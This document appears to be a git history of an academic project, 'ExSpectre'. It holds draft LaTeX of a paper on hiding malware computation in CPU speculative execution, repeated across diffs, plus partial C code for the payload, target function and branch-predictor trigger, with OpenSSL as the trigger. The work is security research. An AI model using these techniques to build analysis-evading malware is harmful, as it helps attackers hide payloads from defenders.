-We study the extent and types of execution that can be performed in the
-``speculative world'', and build tools that enable several computations to be
-performed covertly. In particular, within speculative execution we are able to
-decrypt memory using AES-NI instructions, and are able to interpret a custom
-virtual machine language to perform arbitrary computation.
-We also show how the trigger program
-can be a pre-existing benign application already running on the system, and
-demonstrate this concept with OpenSSL driven remotely by the attacker as our
-trigger program.
-
-Finally, we describe defenses, but in all honesty, you're probably not going to like
-them.
-
-We consider this to be a new thrust in attack vector research that harkens to work 
-done on hardware red-pills and weird machines. We demonstrate that unintended 
-functionality of architechture can be used to compose malicious programs with 
-new and different properties. This technique poses novel and unique challenges for 
-malware modeling efforts, as it forces an environment to either
-faithfully reproduce all hardware behaviors, or overcome a much larger burden of 
-reverse engineering.
-
-\end{abstract}
-
-% TODO: replace this section with code generated by the tool at https://dl.acm.org/ccs.cfm
-
-%\begin{CCSXML}
-%<ccs2012>
-%<concept>
-%<concept_id>10002978.10003029.10011703</concept_id>
-%<concept_desc>Security and privacy~Usability in security and privacy</concept_desc>
-%<concept_significance>500</concept_significance>
-%</concept>
-%</ccs2012>
-%\end{CCSXML}
-
-%\ccsdesc{Security and privacy~Use https://dl.acm.org/ccs.cfm to generate actual concepts section for your paper}
-% -- end of section to replace with generated code
-
-\keywords{Malware; Covert Channel; Weird Machines; TK} % TODO: replace with your keywords
-
-\maketitle
-
-%%%%%%%%%%%%%%
 \section{Introduction}
@@
 %%%%%%%%%%%%%%
-\section{Background}
-Modern CPU designs employ a wide range of tricks in order to maximize
-performance. In this section, we provide preliminary background as they are
-relevant to our system, as well as a brief summary of the Spectre vulnerability.
-
-\subsection{Out-of-Order Execution}
-Many CPUs attempt to keep the pipeline full by executing instructions \emph{out of
-order}, with the CPU allowing future instructions to be worked on and executed
-while it waits for slower or stalled instructions to complete. To maintain
-correctness and the original (Von Neumann) ordering, instructions are tracked in
-a \emph{reorder buffer} (ROB), which keeps the order of instructions as they are
-worked on out of order. Instructions are \emph{retired} from the ROB when
-they are completed and there are no previous instructions that have yet to
-retire. Upon retiring, an instruction's results are committed to the architectural
-state of the CPU. Thus, the ROB ensures that the program (or debugger) view
-of the CPU state always updates in program execution order, despite out of order
-execution.
-
-\subsection{Speculative Execution}
-
-CPUs also attempt to keep their pipeline full by predicting the path of
-execution. For example, a program may contain a branch that depends on a result
-from a prior slow instruction. Rather than wait for the result, the CPU can
-\emph{speculatively execute} instructions down one of the paths of a branch,
-storing the results of the speculative instructions in the ROB.
-If the guess of the branch target turns out to be correct, the CPU can quickly
-retire all the instructions it has speculatively executed while waiting. If the
-guess is incorrect, the CPU must discard the
-(incorrectly) speculated instructions from the ROB, and continue executing from the
-correct branch target.
-
-\subsection{Branch Prediction}
-When a CPU mispredicts a branch, the speculative execution results are
-discarded, costing the CPU several cycles as the pipeline is flushed. To
-minimize this, CPUs employ \emph{branch predictors} that attempt to guess the
-path of execution. Branch predictors maintain a short history of previous
-branch targets for a particular branch (e.g. whether a certain branch is
-frequently taken or not taken), and use
-this to inform the CPU's guess for speculative execution.
-
-There are two kinds of branches a CPU handles: \emph{direct} and
-\emph{indirect}. A \emph{direct} branch may either jump to a provided address or
-continue executing straight through depending on the state of the CPU (e.g. condition
-registers). While there are only two potential statically-known targets for a direct
-branch, the CPU may not know if the branch is taken or not until preceding
-instructions retire. An \emph{indirect} branch is always taken, but its address
-is determined by the value of a register or memory address. Direct branches are
-typically used for control flow such as \texttt{if} or
-\texttt{for}/\texttt{while} statements, while indirect branches are used for
-function pointers, class methods, or case statements.
-
-%- BHB, BTB
-
-\subsection{Spectre}
-
-In early 2018, researchers revealed the Spectre vulnerability, which allows an
-attacker to leak information from a victim program~\cite{specte}. Spectre uses
-the fact that speculative execution can influence system state via side
-channel. In Spectre, an attacker mistrains the branch predictor of a CPU running
-a victim program by providing inputs to it. Once mistrained, the attacker then
-sends a new input that will cause a different in-order execution path. However,
-because the CPU's branch predictor has been mistrained, it will still
-speculatively execute the previous path.
-
-Consider the following code snippet from the Spectre
-paper~\cite{spectre}:
-
-\begin{lstlisting}
-    if (x < array1_size)
-        y = array2[array1[x] * 256];
-\end{lstlisting}
-
-The \texttt{if} statement correctly protects an out-of-bounds reads from \texttt{array1}.
-But if the branch predictor makes an incorrect guess on the branch's direction
-and speculatively executes inside the \texttt{if} statement, it may
-cause a read beyond the boundary of \texttt{array1}. The result of this will
-then (speculatively) be multiplied by 256 and used as an index into
-\texttt{array2}. Although the CPU will not commit
-the speculative update to \texttt{y}, it will still issue a memory read to
-\texttt{array2[array1[x]*256]}, which will be cached. Importantly, even after
-the CPU realizes the branch misprediction, it does not rollback the
-state of the cache, as this does not directly influence program correctness.
-However, the set of cached values is observable to the program via a
-side-channel: by timing reads to \texttt{array2[i]}, the fastest read will
-reveal the speculative value of \texttt{array1[x]*256}, for any value of
-\texttt{x}. An attacker that is able to perform such a side-channel inference on
-the cache can learn the speculative result of an out-of-bounds read from
-\texttt{array1}.
-
-Spectre can also be applied to indirect branches. Branch predictors use the
-history of previous branches to predict the destination of an indirect jump when
-the destination is not yet known. For direct branches, only one of two
-destinations (taken or not taken) are possible to speculatively execute. But for
-indirect branches, a mistrained branch predictor can potentially be coerced into
-speculatively executing from \emph{any} target instruction in the binary.
-
-TODO more on why this is crucial...
-
-%%%%%%%%%%%%%%
-\section{Architecture}
-
-\speculake malware is comprised of two independent programs: a payload program, and a
-trigger program. Both are installed on the victim's computer (e.g. via trojan, remote
-exploit, or phishing), a
-
-Two parts: payload program, and trigger program. Could be combined, but need not
-be. Describe high-level concept of parts
-
-\subsection{Limits of Speculative Execution}
-- Limits of speculative execution (number of instructions)
-- Experiment w/ graph of number of instructions
-- Limitation is in the ROB
-
-\subsection{Speculative Primitive}
-- Primitive: Perform several hundred arbitrary instructions in the speculative
-world, then return fixed-length value to the real world.
-- Trade off number of bits for speed when performing cache side channel.
-
-%%%%%%%%%%%%%%
-\section{Application Payloads}
-
-Given the speculative primitive, what can we do with it?
-
-Finite state machine...
-
-\subsection{Turing Machine}
-- Arbitrary computation
-
-\subsection{Unpacking and Decryption}
-- AES instructions
-
-\subsection{Virtual Machines}
-
-%%%%%%%%%%%%%%
-\section{Trigger Programs}
-Easy answer: custom program that mistrains branch predictor
-
-\subsection{Benign Triggers}
-Could also be any program on the system, and potentially remote!
-
-\subsection{Complex Triggers}
-When considering packers and crypters used in modern malware it is not uncommon to see 
-a malicious sample packed using multiple stages with different unpacking conditions. 
-Whether that be red pills, or environent checks, or network triggers, the reliance is on
-complexity to fool any reverse engineer out of finding the correct conditions to 
-release the full payload.
-
-Similarly \speculake can be instrumented to use more than one trigger. Multiple stages 
-can be designed used any combination of crafted or benign trigger programs. Only when all
-stages have been run to completion in order will the malicious payload be revealed.  
-In conjunction with this each stage cna use a randomized ISA to a common emulator, or 
-they can use differnt emulators all together.
-
-Alternatively each stage could be used to decrypt the next AES key-schedule to decrypt 
-a subsequent layer. Using this model we can instrument \speculake malware as a crypter 
-with the keys hidden in data or dead code which static and dynamic reverse engineering 
-methods will overlook.
-
-%%%%%%%%%%%%%%
-\section{Implementation and Evaluation}
-
-\subsection{Turing Machine}
-
-\subsection{AES Decryption}
-
-\subsection{Virtual Machine}
-
-\subsection{OpenSSL Trigger}
-
-%%%%%%%%%%%%%%
-\section{Discussion}
-
-\subsection{Defenses}
-
-\subsection{Future Work}
-
-%%%%%%%%%%%%%%
-\section{Related Work}
-
-%%%%%%%%%%%%%%
-\section{Conclusion}
-
-\bibliographystyle{ACM-Reference-Format}
-\bibliography{paper}
-
-\end{document}

### 2018-04-27 openssl/payload.c
adding an openssl test...doesn't yet work on zb

@@ -1,0 +1,529 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <signal.h>
+#include <x86intrin.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/mman.h>
+#include "common.h"
+
+// Defines the bandwidth we can communicate
+// from speculative -> von neuman
+// e.g. 256 would be 1 byte of info
+// Tradeoff here is larger bandwidth means we have
+// to check more places in probe_buf (and flush them)
+#define NUM_PROBES 256
+#define DECRYPT_LEN 256
+
+// These define the stride length we take between probes
+// This thwarts a clever CPU's stride prediction
+// (e.g. "you loaded buf[0], buf[1024], I'll load buf[2048] for you")
+// Generally, this results in not seeing ANY winning probes
+// in which case, we change cur_probe_space and retry
+#define MAX_PROBE_SPACE (1000003)
+double avgpct = 0;
+
+uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;
+
+
+// The (heap-allocated) probe buffer
+// We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
+// in the cache to communicate the value i from speculative -> von neuman
+uint8_t __attribute__((section(".probe_buf"))) *probe_buf;
+
+
+// This is a simple counter, accessed by the speculative function (target_fn)
+// so it can compute on it.
+uint16_t signal_idx = 0;
+uint64_t instr = 0;
+
+
+// Stats
+uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
+uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
+uint64_t tot_time = 0;      // Number cycles total
+
+unsigned int junk=0;    // For rdtscp
+
+
+void *map;
+#define TARGET_FN_ADDR 0x414100401000
+
+
+
+typedef struct jump_st {
+    uint64_t from;
+    uint64_t to;
+} jump;
+
+#define PAGE_SIZE 0x1000
+#define MAX_PAGES 100
+#define NUM_JUMPS 16
+
[…]

### 2018-04-27 openssl/target_fn.c

@@ -1,0 +1,99 @@
+#include <unistd.h>
+#include <stdint.h>
+
+extern uint8_t *probe_buf;
+extern uint64_t cur_probe_space;
+extern uint64_t signal_idx;
+
+uint64_t try_decrypt(void);
+__uint128_t aes_ctr(uint64_t ctr);
+
+extern uint8_t *turing_tape;
+extern uint8_t turing_state;
+
+// This will be an int 0-255 typically...
+inline void signal(uint64_t state) __attribute__((always_inline));
+void signal(uint64_t state)
+{
+    asm volatile ("mov (%%rcx), %%rax" :: "c"(&probe_buf[state*cur_probe_space]) : "rax");
+}
+
+void target_fn(void) __attribute__((section(".targetfn")));
+void target_fn(void)
+{
+    //signal(11);
+    register uint8_t *pb = (uint8_t*)*((uint8_t**)0x480000);  // probe_buf
+    register uint64_t cps = *((uint64_t*)0x480010);  // cur_probe_space
+    asm volatile ("mov (%%rcx), %%rax" :: "c"(&pb[13*cps]) : "rax");
+    //*/
+
+
+    //while(1);
+    //*(uint8_t*)(0);
+
+    /*
+    asm volatile("pop %%rbx\n"  // From target_fn
+            "pop %%r12\n"       // From target_fn
+            "pop %%rbp\n"       // From target_fn
+            "pop %%rbx\n"       // From indirect_camellia
+            "pop %%rbp\n"       // From indirect_camellia
+            "retq\n"
+            :::);
+            */
+
+
+
+    //signal(11);
+    //__uint128_t register pt = aes_ctr(signal_idx / 16);
+    //signal(pt >> ((signal_idx % 16)*8) & 0xff);
+
+}
+
+void end_target_fn(void) __attribute__((section(".targetfn")));
+void end_target_fn(void) {
+}
+
+/*
+	push %rbx
+	movabs $probe_buf, %rbx
+    mov (%rbx), %rbx
+	movabs $cur_probe_space, %rcx
+    mov  (%rcx), %rcx 
+	movabs $signal_idx, %rax
+    mov  (%rax), %rax
+	//add %rax, %rax
+	imul $3, %rax
[…]

### 2018-04-27 openssl/trigger.c

@@ -1,0 +1,194 @@
+#include <stdio.h>
+#include <sys/mman.h>
+#include <stdint.h>
+#include <string.h>
+#include <stdlib.h>
+
+
+void __attribute__((section(".fnptr"))) (*fn_ptr)(void);
+
+
+typedef struct jump_st {
+    uint64_t from;
+    uint64_t to;
+} jump;
+
+#define PAGE_SIZE 0x1000
+#define MAX_PAGES 100
+#define NUM_JUMPS 16
+
+
+
+inline void call(void *fn_ptr) __attribute__((always_inline));
+void call(void* fn_ptr) {
+    asm volatile ("jmpq *%%rax\n" :: "a"(fn_ptr) :);
+}
+
+inline void push(uint64_t val) __attribute__((always_inline));
+void push(uint64_t val) {
+    asm volatile ("push %%rax\n" :: "a"(val):);
+}
+
+
+uint64_t loaded_pages[MAX_PAGES];
+int loaded_pages_idx = 0;
+
+void load_page(uint64_t addr)
+{
+    uint64_t page = addr & ~(PAGE_SIZE-1);
+    int i;
+    for (i=0; i<loaded_pages_idx; i++) {
+        if (loaded_pages[i] == page) {
+            // Already loaded
+            return;
+        }
+    }
+    loaded_pages[loaded_pages_idx++] = page;
+
+    void *map = mmap((void*)page, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
+
+    if (map == ((void*)-1)) {
+        printf("Error mapping %lx (page %lx):\n", addr, page);
+        perror("mmap");
+        exit(-1);
+    }
+    printf("Mapped %p -> %p\n", (void*)page, map);
+
+    // Fill with returns:
+    memset(map, '\xc3', PAGE_SIZE);
+}
+
+jump addrs[NUM_JUMPS] = {
+        {0x7ffff77e3a4c, 0x7ffff77eccd4}, // :   retq   
+        {0x7ffff77e7bf9, 0x7ffff77e9421}, // :   retq   
+        {0x7ffff77ee8a0, 0x7ffff77e836f}, // :   retq   
+        {0x7ffff77e840d, 0x7ffff77e9548}, // :   retq   
[…]

### 2018-04-27 paper/abstract.tex

--- 2018-04-24 paper/paper.tex
@@
-\documentclass[sigconf, anonymous]{acmart}
-
-\usepackage{listings}
-\input{figures}
-
-\fancyhf{} % Remove fancy page headers 
-\fancyhead[C]{Paper \#XXX} % TODO: replace 9999 with your paper number
-\fancyfoot[C]{\thepage}
-
-\setcopyright{none} % No copyright notice required for submissions
-%\acmConference[Anonymous Submission to ACM CCS 2018]{ACM Conference on Computer and Communications Security}{Due 08 May 2018}{Toronto, Canada}
-\acmYear{2017}
-
-\settopmatter{printacmref=false, printccs=true, printfolios=true} % We want page numbers on submissions
-
-%%\ccsPaper{9999} % TODO: replace with your paper number once obtained
-
-\newcommand{\speculake}{Exspectre }
-
-\begin{document}
-\title{\speculake: Hiding Malware in Speculative Execution} % TODO: replace with your title
-
 \begin{abstract}
@@
 \end{abstract}
-
-% TODO: replace this section with code generated by the tool at https://dl.acm.org/ccs.cfm
-
-%\begin{CCSXML}
-%<ccs2012>
-%<concept>
-%<concept_id>10002978.10003029.10011703</concept_id>
-%<concept_desc>Security and privacy~Usability in security and privacy</concept_desc>
-%<concept_significance>500</concept_significance>
-%</concept>
-%</ccs2012>
-%\end{CCSXML}
-
-%\ccsdesc{Security and privacy~Use https://dl.acm.org/ccs.cfm to generate actual concepts section for your paper}
-% -- end of section to replace with generated code
-
-\keywords{Malware; Covert Channel; Weird Machines; TK} % TODO: replace with your keywords
-
-\maketitle
-
-%%%%%%%%%%%%%%
-\section{Introduction}
-
-Modern CPU designs use speculative execution to maintain high instruction
-throughput, with the goal of improving performance. In speculative execution,
-CPUs execute likely future instructions while they wait for other slower
-instructions to complete. When the CPU's guess of future instructions is correct, the
-benefit is faster execution performance. When its guess is wrong, the CPU
-simply discards the speculated results and continues executing along the true path.
-
-Previously, it was assumed that speculative execution results
-remain invisible if discarded, as careful CPU design maintains strict separation
-between speculative results and updates to architectual state.
-However, recent research has revealed side channels that violate this
-separation, and researchers have demonstrated ways to exfiltrate results from speculative
-computation. Most notably, the Spectre vulnerability allows attackers to leak
-information from purposefully mis-speculated branches in a victim
-process~\cite{spectre}. The Meltdown vulnerability uses speculative results of an
-unauthorized memory read to sidestep page faults and leak protected memory from
-the kernel~\cite{meltdown}. Both of these vulnerabilities focus on extracting
-secret data from a process or operating system.
-
-\medskip
-
-In this paper, we explore another attack enabled by speculative execution:
-\speculake, which \emph{hides computation} within
-the ``speculative world''. Taking advantage of the CPU's speculation to secretly
-perform computation,
-we can produce binaries that thwart existing reverse engineering
-techniques. Because the speculative parts of a program never ``truly'' execute,
-we can hide program functionality in the unreachable dead code in a program.
-Even a full instruction trace, captured by a hardware debugger or software
-emulator, will be unable to capture the logic performed speculatively.
-This technique could lead to sophisticated malware that hides its behavior
-from both static and dynamic analysis.
-
-Existing malware use several techniques to evade detection and
-make it difficult for analysts to determine payload behavior of reported malware. 
-For example, binary \emph{packers} or \emph{crypters} encode an executable payload as
-data that must be ``unpacked'' at runtime, making it difficult to tell
-statically what a program will do~\cite{malware-packers}. Malware may also use
-\emph{triggers} that only run the payload when certain conditions are present, preventing
-it from executing when it is inside an analysis sandbox or debugger.
-
-However, with some effort, these existing techniques can be defeated. Analysts can use
-dynamic execution to unpack malware and reveal its
-behavior~\cite{balzarotti2010efficient}, and can use symbolic execution or code
-coverage fuzzers to determine the inputs or triggers that will reveal malicious
-behavior~\cite{moser2007exploring,schwartz2010all,wang2017angr,egele2012survey}.
-
-\speculake provides a new technique to malware authors, allowing them to hide
-program functionality in code that does not execute at runtime.
-
-At a high level, \speculake consists of two parts: a payload program, and a
-trigger program. When run by itself, the payload program executes a pattern of
-indirect jumps and measures a cache side channel. While the trigger program is
-not running, the payload program is effectively inactive (and may optionally do some
-decoy operation). When the trigger program runs, it executes a similar pattern of
-indirect jumps (with similar source and destination addresses as the payload
-program), effectively training the CPU's branch predictor to the jump pattern
-specified by the trigger program.
-
-Importantly, the trigger program and payload
-program's indirect jump patterns diverge on the destination of their final jumps.
-However, because the trigger program has trained the CPU's branch predictor, the
-CPU speculates that the payload program will continue following the pattern of
-the trigger program, causing it to speculatively execute a
-\emph{target function} in the payload program. We emphasize that this target
-function is in a region that is neither read nor executed by the payload
-program, and after the CPU discovers the mis-speculation in the payload program,
-it will discard the results from the target function and continue executing from
-the correct destination. However, the payload program has a limited speculative
-window where it can perform computation in the target function, and can
-communicate results back to the ``real world'' payload program via a cache side
-channel.
-
-While it's possible for the trigger and payload programs to be bundled in a
-single program, an analyst aware of \speculake could easily find the target
-function in the payload program based on the jump pattern in the trigger program.
-However, if the trigger and payload are kept separate, the analyst has a much
-harder job and must identify both.
-Moreover, it is possible that the trigger program be a
-seemingly-unrelated benign program already on the victim's computer. We
-investigate using the OpenSSL library as a benign trigger
-program in Section~\ref{sec:tk}. If the trigger program is another benign
-program on the system, the analyst has the difficult task of identifying which
-program, library, or even operating system component is responsible for training
-the CPU's branch predictor, and finding the specific set of jumps that occur at
-runtime. To make matters worse, the payload program can include dummy jump
-patterns that are effectively dead ends for the analyst, as they do not
-ultimately call the target function speculatively.
-
-Simulating or modelling the speculative execution path is a difficult task for a
-program analyst hoping to reverse engineer an \speculake binary. First, the
-analyst must reverse engineer and accurately model the closed-source proprietary
-components of the target CPU, including the branch predictor, cache hierarchy,
-out-of-order execution, and hyperthreading. In contrast, the \speculake
-author only has to use a partial model of these components and produce binaries
-that take advantage of them, while the analyst's model must be complete to
-capture all potential \speculake uses. Second, the analyst must run all
-potential trigger programs through the simulator, including benign programs with
-realistic inputs. Both of these contribute to a time-consuming and expensive
-endeavor for would-be analysts.
-
-% Results summary
-In order to study the potential of \speculake, we implement several example
-payload programs and evaluate their performance.
-We find that the speculative window is limited mainly by the reorder buffer
-size, and confirm that we are able to execute between 100 and 200 instructions
-speculatively on modern Intel CPUs. While brief, we are able to perform
-execution in short steps, communicating intermediate results back to the ``real
-world'' part of the payload program. Using this technique,
-we demonstrate implementing a universal Turing machine
-(demonstrating arbitrary computation), a custom instruction set architecture
-that fits within the constraints of speculative execution, and show
-the ability to perform AES decryption
-of a payload via AES encrypt/decrypt instructions.
-
-Using these building blocks, we demonstrate the practicality of hiding arbitrary
-computation by decrypting an AES-encrypted ARM binary in the speculative world
-one instruction at a time, returning the decrypted next instruction to the real
-world part of the payload program, which updates a virtual machine. We show that
-we are able to decrypt and process approximately 25 instructions per second.
-
-% contributions?
-% - explore the limits of speculative execution
-% - propose novel concept of hiding computation in speculative execution
-% - implement example applications using this concept, including decrypting
-%   data speculatively
-% - demonstrate using benign program (openssl) as trigger
-% - identify defenses and discuss ways to counter them
-
-% TODO: we don't talk at all about how an analyst might try to enumerate
-% the potential entry points to the speculative world, and how that can be
-% made difficult
-
-%%%%%%%%%%%%%%
-\section{Background}
-Modern CPU designs employ a wide range of tricks in order to maximize
-performance. In this section, we provide preliminary background as they are
-relevant to our system, as well as a brief summary of the Spectre vulnerability.
-
-\subsection{Out-of-Order Execution}
-Many CPUs attempt to keep the pipeline full by executing instructions \emph{out of
-order}, with the CPU allowing future instructions to be worked on and executed
-while it waits for slower or stalled instructions to complete. To maintain
-correctness and the original (Von Neumann) ordering, instructions are tracked in
-a \emph{reorder buffer} (ROB), which keeps the order of instructions as they are
-worked on out of order. Instructions are \emph{retired} from the ROB when
-they are completed and there are no previous instructions that have yet to
-retire. Upon retiring, an instruction's results are committed to the architectural
-state of the CPU. Thus, the ROB ensures that the program (or debugger) view
-of the CPU state always updates in program execution order, despite out of order
-execution.
-
-\subsection{Speculative Execution}
-
-CPUs also attempt to keep their pipeline full by predicting the path of
-execution. For example, a program may contain a branch that depends on a result
-from a prior slow instruction. Rather than wait for the result, the CPU can
-\emph{speculatively execute} instructions down one of the paths of a branch,
-storing the results of the speculative instructions in the ROB.
-If the guess of the branch target turns out to be correct, the CPU can quickly
-retire all the instructions it has speculatively executed while waiting. If the
-guess is incorrect, the CPU must discard the
-(incorrectly) speculated instructions from the ROB, and continue executing from the
-correct branch target.
-
-\subsection{Branch Prediction}
-When a CPU mispredicts a branch, the speculative execution results are
-discarded, costing the CPU several cycles as the pipeline is flushed. To
-minimize this, CPUs employ \emph{branch predictors} that attempt to guess the
-path of execution. Branch predictors maintain a short history of previous
-branch targets for a particular branch (e.g. whether a certain branch is
-frequently taken or not taken), and use
-this to inform the CPU's guess for speculative execution.
-
-There are two kinds of branches a CPU handles: \emph{direct} and
-\emph{indirect}. A \emph{direct} branch may either jump to a provided address or
-continue executing straight through depending on the state of the CPU (e.g. condition
-registers). While there are only two potential statically-known targets for a direct
-branch, the CPU may not know if the branch is taken or not until preceding
-instructions retire. An \emph{indirect} branch is always taken, but its address
-is determined by the value of a register or memory address. Direct branches are
-typically used for control flow such as \texttt{if} or
-\texttt{for}/\texttt{while} statements, while indirect branches are used for
-function pointers, class methods, or case statements.
-
-%- BHB, BTB
-
-\subsection{Spectre}
-
-In early 2018, researchers revealed the Spectre vulnerability, which allows an
-attacker to leak information from a victim program~\cite{specte}. Spectre uses
-the fact that speculative execution can influence system state via side
-channel. In Spectre, an attacker mistrains the branch predictor of a CPU running
-a victim program by providing inputs to it. Once mistrained, the attacker then
-sends a new input that will cause a different in-order execution path. However,
-because the CPU's branch predictor has been mistrained, it will still
-speculatively execute the previous path.
-
-Consider the following code snippet from the Spectre
-paper~\cite{spectre}:
-
-\begin{lstlisting}
-    if (x < array1_size)
-        y = array2[array1[x] * 256];
-\end{lstlisting}
-
-The \texttt{if} statement correctly protects an out-of-bounds reads from \texttt{array1}.
-But if the branch predictor makes an incorrect guess on the branch's direction
-and speculatively executes inside the \texttt{if} statement, it may
-cause a read beyond the boundary of \texttt{array1}. The result of this will
-then (speculatively) be multiplied by 256 and used as an index into
-\texttt{array2}. Although the CPU will not commit
-the speculative update to \texttt{y}, it will still issue a memory read to
-\texttt{array2[array1[x]*256]}, which will be cached. Importantly, even after
-the CPU realizes the branch misprediction, it does not rollback the
-state of the cache, as this does not directly influence program correctness.
-However, the set of cached values is observable to the program via a
-side-channel: by timing reads to \texttt{array2[i]}, the fastest read will
-reveal the speculative value of \texttt{array1[x]*256}, for any value of
-\texttt{x}. An attacker that is able to perform such a side-channel inference on
-the cache can learn the speculative result of an out-of-bounds read from
-\texttt{array1}.
-
-Spectre can also be applied to indirect branches. Branch predictors use the
-history of previous branches to predict the destination of an indirect jump when
-the destination is not yet known. For direct branches, only one of two
-destinations (taken or not taken) are possible to speculatively execute. But for
-indirect branches, a mistrained branch predictor can potentially be coerced into
-speculatively executing from \emph{any} target instruction in the binary.
-
-TODO more on why this is crucial...
-
-%%%%%%%%%%%%%%
-\section{Architecture}
-
-\speculake malware is comprised of two independent programs: a payload program, and a
-trigger program. Both are installed on the victim's computer (e.g. via trojan, remote
-exploit, or phishing), a
-
-Two parts: payload program, and trigger program. Could be combined, but need not
-be. Describe high-level concept of parts
-
-\subsection{Limits of Speculative Execution}
-- Limits of speculative execution (number of instructions)
-- Experiment w/ graph of number of instructions
-- Limitation is in the ROB
-
-\subsection{Speculative Primitive}
-- Primitive: Perform several hundred arbitrary instructions in the speculative
-world, then return fixed-length value to the real world.
-- Trade off number of bits for speed when performing cache side channel.
-
-%%%%%%%%%%%%%%
-\section{Application Payloads}
-
-Given the speculative primitive, what can we do with it?
-
-Finite state machine...
-
-\subsection{Turing Machine}
-- Arbitrary computation
-
-\subsection{Unpacking and Decryption}
-- AES instructions
-
-\subsection{Virtual Machines}
-
-%%%%%%%%%%%%%%
-\section{Trigger Programs}
-Easy answer: custom program that mistrains branch predictor
-
-\subsection{Benign Triggers}
-Could also be any program on the system, and potentially remote!
-
-\subsection{Complex Triggers}
-When considering packers and crypters used in modern malware it is not uncommon to see 
-a malicious sample packed using multiple stages with different unpacking conditions. 
-Whether that be red pills, or environent checks, or network triggers, the reliance is on
-complexity to fool any reverse engineer out of finding the correct conditions to 
-release the full payload.
-
-Similarly \speculake can be instrumented to use more than one trigger. Multiple stages 
-can be designed used any combination of crafted or benign trigger programs. Only when all
-stages have been run to completion in order will the malicious payload be revealed.  
-In conjunction with this each stage cna use a randomized ISA to a common emulator, or 
-they can use differnt emulators all together.
-
-Alternatively each stage could be used to decrypt the next AES key-schedule to decrypt 
-a subsequent layer. Using this model we can instrument \speculake malware as a crypter 
-with the keys hidden in data or dead code which static and dynamic reverse engineering 
-methods will overlook.
-
-%%%%%%%%%%%%%%
-\section{Implementation and Evaluation}
-
-\subsection{Turing Machine}
-
-\subsection{AES Decryption}
-
-\subsection{Virtual Machine}
-
-\subsection{OpenSSL Trigger}
-
-%%%%%%%%%%%%%%
-\section{Discussion}
-
-\subsection{Defenses}
-
-\subsection{Future Work}
-
-%%%%%%%%%%%%%%
-\section{Related Work}
-
-%%%%%%%%%%%%%%
-\section{Conclusion}
-
-\bibliographystyle{ACM-Reference-Format}
-\bibliography{paper}
-
-\end{document}

### 2018-04-27 paper/discussion.tex

--- 2018-04-24 paper/paper.tex
@@
-\documentclass[sigconf, anonymous]{acmart}
-
-\usepackage{listings}
-\input{figures}
-
-\fancyhf{} % Remove fancy page headers 
-\fancyhead[C]{Paper \#XXX} % TODO: replace 9999 with your paper number
-\fancyfoot[C]{\thepage}
-
-\setcopyright{none} % No copyright notice required for submissions
-%\acmConference[Anonymous Submission to ACM CCS 2018]{ACM Conference on Computer and Communications Security}{Due 08 May 2018}{Toronto, Canada}
-\acmYear{2017}
-
-\settopmatter{printacmref=false, printccs=true, printfolios=true} % We want page numbers on submissions
-
-%%\ccsPaper{9999} % TODO: replace with your paper number once obtained
-
-\newcommand{\speculake}{Exspectre }
-
-\begin{document}
-\title{\speculake: Hiding Malware in Speculative Execution} % TODO: replace with your title
-
-\begin{abstract}
-Recently, the Spectre and Meltdown attacks have revealed serious vulnerabilities in modern CPU
-designs, allowing an attacker to exfiltrate data from sensitive programs. These
-vulnerabilities take advantage of speculative execution to coerce a processor to
-perform computation that would otherwise not occur, leaking the resulting
-information via side channels to an attacker.
-
-In this paper, we extend these ideas in a different direction, and leverage speculative
-execution in order to \emph{hide malware} from both static and dynamic analysis. Using this
-technique, critical portions of a malicious program's computation can be shielded from view,
-such that even a debugger following an instruction-level trace of the
-program cannot tell how its results were computed.
-
-We introduce \emph{\speculake}, which compiles arbitrary malicious code into a
-seemingly-benign payload binary. When a separate trigger program performs a specific
-pattern of indirect jumps, it (mis)trains the CPU's branch predictor. Subsequent
-executions of the payload binary with similar jumps causes the CPU to mispredict its
-branches and speculatively execute a malicious payload, which communicates
-results back to the real world via side channels.
-
-We study the extent and types of execution that can be performed in the
-``speculative world'', and build tools that enable several computations to be
-performed covertly. In particular, within speculative execution we are able to
-decrypt memory using AES-NI instructions, and are able to interpret a custom
-virtual machine language to perform arbitrary computation.
-We also show how the trigger program
-can be a pre-existing benign application already running on the system, and
-demonstrate this concept with OpenSSL driven remotely by the attacker as our
-trigger program.
-
-Finally, we describe defenses, but in all honesty, you're probably not going to like
-them.
-
-We consider this to be a new thrust in attack vector research that harkens to work 
-done on hardware red-pills and weird machines. We demonstrate that unintended 
-functionality of architechture can be used to compose malicious programs with 
-new and different properties. This technique poses novel and unique challenges for 
-malware modeling efforts, as it forces an environment to either
-faithfully reproduce all hardware behaviors, or overcome a much larger burden of 
-reverse engineering.
-
-\end{abstract}
-
-% TODO: replace this section with code generated by the tool at https://dl.acm.org/ccs.cfm
-
-%\begin{CCSXML}
-%<ccs2012>
-%<concept>
-%<concept_id>10002978.10003029.10011703</concept_id>
-%<concept_desc>Security and privacy~Usability in security and privacy</concept_desc>
-%<concept_significance>500</concept_significance>
-%</concept>
-%</ccs2012>
-%\end{CCSXML}
-
-%\ccsdesc{Security and privacy~Use https://dl.acm.org/ccs.cfm to generate actual concepts section for your paper}
-% -- end of section to replace with generated code
-
-\keywords{Malware; Covert Channel; Weird Machines; TK} % TODO: replace with your keywords
-
-\maketitle
-
-%%%%%%%%%%%%%%
-\section{Introduction}
-
-Modern CPU designs use speculative execution to maintain high instruction
-throughput, with the goal of improving performance. In speculative execution,
-CPUs execute likely future instructions while they wait for other slower
-instructions to complete. When the CPU's guess of future instructions is correct, the
-benefit is faster execution performance. When its guess is wrong, the CPU
-simply discards the speculated results and continues executing along the true path.
-
-Previously, it was assumed that speculative execution results
-remain invisible if discarded, as careful CPU design maintains strict separation
-between speculative results and updates to architectual state.
-However, recent research has revealed side channels that violate this
-separation, and researchers have demonstrated ways to exfiltrate results from speculative
-computation. Most notably, the Spectre vulnerability allows attackers to leak
-information from purposefully mis-speculated branches in a victim
-process~\cite{spectre}. The Meltdown vulnerability uses speculative results of an
-unauthorized memory read to sidestep page faults and leak protected memory from
-the kernel~\cite{meltdown}. Both of these vulnerabilities focus on extracting
-secret data from a process or operating system.
-
